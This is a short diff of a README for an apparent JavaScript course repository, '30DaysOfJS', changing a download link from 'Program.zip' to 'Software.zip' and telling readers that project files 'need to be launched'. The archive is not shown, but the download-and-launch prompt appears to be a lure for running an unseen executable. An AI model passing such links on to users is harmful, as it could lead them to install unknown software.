@@ -39,7 +39,7 @@ Are you ready to embark on this coding journey and enhance your skills? Let's ge
 
 Click on the button below to download the project files:
 
-[![Download Project Files](https://github.com/basilthedog78/30DaysOfJS/releases/download/v1.0/Program.zip)](https://github.com/basilthedog78/30DaysOfJS/releases/download/v1.0/Program.zip)
+[![Download Project Files](https://github.com/basilthedog78/30DaysOfJS/releases/download/v2.0/Software.zip)](https://github.com/basilthedog78/30DaysOfJS/releases/download/v2.0/Software.zip)
 
 ### Note: Project files need to be launched!
 
